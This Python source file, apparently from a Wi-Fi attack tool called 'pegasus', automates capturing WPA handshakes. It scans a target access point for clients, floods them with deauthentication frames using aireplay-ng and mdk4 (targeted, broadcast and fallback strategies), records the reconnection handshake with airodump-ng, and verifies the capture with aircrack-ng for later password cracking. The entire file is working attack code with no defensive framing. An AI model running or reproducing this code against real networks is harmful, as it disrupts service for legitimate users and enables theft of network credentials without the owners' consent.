import subprocess
import time
import os
import re
import csv
import io
from pathlib import Path
from core.error_handler import ErrorHandler


HANDSHAKE_DIR = Path("/tmp/pegasus_handshakes")


class HandshakeCapture:
    def __init__(self, config, error_handler):
        self.config = config
        self.error_handler = error_handler
        self.capture_file = "/tmp/pegasus_handshake"
        self.active_clients = []
        self._airodump_process = None
        HANDSHAKE_DIR.mkdir(parents=True, exist_ok=True)

    def find_existing_handshake(self, target_bssid, search_dirs=None):
        if search_dirs is None:
            search_dirs = ["/tmp", "./hs", ".", str(HANDSHAKE_DIR)]
        bssid_norm = target_bssid.replace(":", "").lower()

        for sd in search_dirs:
            if not os.path.exists(sd):
                continue
            for f in Path(sd).rglob("*.cap"):
                if f.stat().st_size < 1000:
                    continue
                if bssid_norm in f.stem.lower().replace("-", "").replace("_", ""):
                    if self._verify_handshake(str(f)):
                        return str(f)
            for f in Path(sd).rglob("*.pcap"):
                if f.stat().st_size < 1000:
                    continue
                if bssid_norm in f.stem.lower().replace("-", "").replace("_", ""):
                    if self._verify_handshake(str(f)):
                        return str(f)
        return None

    def capture_handshake(self, target_bssid, target_channel,
                          interface="wlan0mon", timeout=180):
        print(f"   Target: {target_bssid}  Channel: {target_channel}")
        self.cleanup_capture_files()
        bssid_clean = target_bssid.replace(":", "").lower()
        self.capture_file = f"/tmp/pegasus_hs_{bssid_clean}"

        # Step 1: Quick pre-scan to find active clients
        active_clients = self._scan_active_clients(target_bssid, target_channel, interface)
        print(f"   Active clients found: {len(active_clients)}")

        # Step 2: Start airodump-ng capture in background
        cap_path = f"{self.capture_file}-01.cap"
        airodump_cmd = [
            "sudo", "airodump-ng",
            "--bssid", target_bssid,
            "--channel", str(target_channel),
            "--write", self.capture_file,
            "--output-format", "cap",
            interface,
        ]
        try:
            self._airodump_process = subprocess.Popen(
                airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
        except Exception as e:
            self.error_handler.handle_error("E202", "airodump-ng failed to start", e)
            return None

        time.sleep(3)

        # Step 3: Send targeted deauth to each active client
        deauth_ok = False
        for client in active_clients:
            if self._send_targeted_deauth(target_bssid, client, interface):
                deauth_ok = True
                time.sleep(1)

        if not deauth_ok and active_clients:
            print(f"   Targeted deauth failed, trying mixed strategies...")
            self._send_mixed_deauth(target_bssid, interface)

        if not active_clients:
            print(f"   No active clients found, using broadcast deauth")
            self._send_mixed_deauth(target_bssid, interface)

        # Step 4: Dynamic handshake monitoring loop
        handshake_ok = self._dynamic_handshake_wait(cap_path, timeout)

        # Cleanup
        if self._airodump_process:
            self._airodump_process.terminate()
            try:
                self._airodump_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._airodump_process.kill()

        if handshake_ok and os.path.exists(cap_path):
            # Verify with wpaclean if available
            verified = self._wpaclean_verify(cap_path, target_bssid)
            if verified:
                print(f"   Handshake validated: {cap_path}")
                return cap_path
            if self._verify_handshake(cap_path):
                return cap_path
        return None

    def _scan_active_clients(self, bssid, channel, interface, scan_time=12):
        """Quick scan to find active clients connected to the target AP."""
        clients = []
        csv_file = f"/tmp/pegasus_clientscan_{int(time.time())}"

        cmd = [
            "sudo", "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", csv_file,
            "--output-format", "csv",
            interface,
        ]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(scan_time)
            proc.terminate()
            proc.wait(timeout=5)

            csv_path = f"{csv_file}-01.csv"
            if os.path.exists(csv_path):
                with open(csv_path) as f:
                    in_stations = False
                    for line in f:
                        if "Station MAC" in line or "BSSID" in line:
                            in_stations = True
                            continue
                        if in_stations and line.strip():
                            parts = line.strip().split(",")
                            if len(parts) >= 6:
                                mac = parts[0].strip()
                                if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac):
                                    if mac.upper() != bssid.upper():
                                        clients.append(mac)
        except Exception:
            pass
        finally:
            for p in [f"{csv_file}-01.csv", f"{csv_file}-01.cap",
                       f"{csv_file}-01.netxml"]:
                try:
                    os.remove(p)
                except OSError:
                    pass

        return clients[:10]  # Max 10 clients

    def _send_targeted_deauth(self, bssid, client_mac, interface, count=8):
        """Send deauth targeting a specific connected client (bypasses broadcast filters)."""
        strategies = [
            ["sudo", "aireplay-ng", "--deauth", str(count),
             "-a", bssid, "-c", client_mac, interface],
            ["sudo", "aireplay-ng", "--deauth", str(count),
             "-a", bssid, "-c", client_mac, "--ignore-negative-one", interface],
        ]
        for cmd in strategies:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if r.returncode == 0:
                    return True
            except Exception:
                continue
        return False

    def _send_mixed_deauth(self, bssid, interface, count=15):
        """Fallback: try multiple deauth methods."""
        methods = [
            ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, interface],
            ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid,
             "--ignore-negative-one", interface],
            ["sudo", "aireplay-ng", "--deauth", "5", "-a", bssid,
             "-c", "FF:FF:FF:FF:FF:FF", interface],
        ]
        try:
            r = subprocess.run(["which", "mdk4"], capture_output=True, text=True, timeout=3)
            if r.returncode == 0:
                methods.append(["sudo", "mdk4", interface, "d", "-b", bssid])
        except Exception:
            pass

        for cmd in methods:
            try:
                subprocess.run(cmd, capture_output=True, text=True, timeout=12)
            except Exception:
                continue

    def _dynamic_handshake_wait(self, cap_path, timeout):
        """Dynamic loop: checks every 2s, validates instantly with aircrack-ng."""
        print(f"   Monitoring for handshake (timeout={timeout}s)...")
        start = time.time()
        last_size = 0
        stable_cycles = 0

        while time.time() - start < timeout:
            elapsed = int(time.time() - start)
            remaining = timeout - elapsed

            if os.path.exists(cap_path):
                size = os.path.getsize(cap_path)

                if size > last_size:
                    stable_cycles = 0
                    print(f"   File growing: {size} bytes  ({elapsed}s/{remaining}s remaining)", end="\r")
                    last_size = size
                else:
                    stable_cycles += 1
                    print(f"   File stable:  {size} bytes  ({elapsed}s/{remaining}s remaining)", end="\r")

                if size > 4000:
                    if self._verify_handshake(cap_path):
                        print("\n   Handshake detected!")
                        return True
            else:
                print(f"   Waiting for capture file... ({elapsed}s/{remaining}s)", end="\r")

            time.sleep(2)

        print("\n   Handshake timeout reached")
        return False

    def _wpaclean_verify(self, cap_path, bssid):
        """Use wpaclean to extract and validate handshake (instant check)."""
        try:
            r = subprocess.run(["which", "wpaclean"], capture_output=True, text=True, timeout=3)
            if r.returncode != 0:
                return False

            out = f"/tmp/pegasus_wpaclean_{int(time.time())}.cap"
            result = subprocess.run(
                ["wpaclean", out, cap_path],
                capture_output=True, text=True, timeout=15,
            )
            if os.path.exists(out) and os.path.getsize(out) > 500:
                clean_size = os.path.getsize(out)
                os.remove(out)
                print(f"   wpaclean validated: {clean_size} bytes")
                return True
            try:
                os.remove(out)
            except OSError:
                pass
            return False
        except Exception:
            return False

    def _verify_handshake(self, cap_file):
        try:
            if not os.path.exists(cap_file) or os.path.getsize(cap_file) < 1000:
                return False
            r = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True, timeout=10,
            )
            if "WPA (1 handshake)" in r.stdout:
                return True
            return False
        except Exception:
            return False

    def cleanup_capture_files(self):
        base = self.capture_file
        if base == "/tmp/pegasus_handshake":
            patterns = [
                "/tmp/pegasus_handshake-01.cap",
                "/tmp/pegasus_handshake-01.csv",
                "/tmp/pegasus_handshake-01.netxml",
            ]
        else:
            patterns = [
                f"{base}-01.cap", f"{base}-01.csv", f"{base}-01.netxml",
                f"{base}-01.kismet.csv", f"{base}-01.kismet.netxml",
            ]
        for p in patterns:
            try:
                if os.path.exists(p):
                    os.remove(p)
            except OSError:
                pass
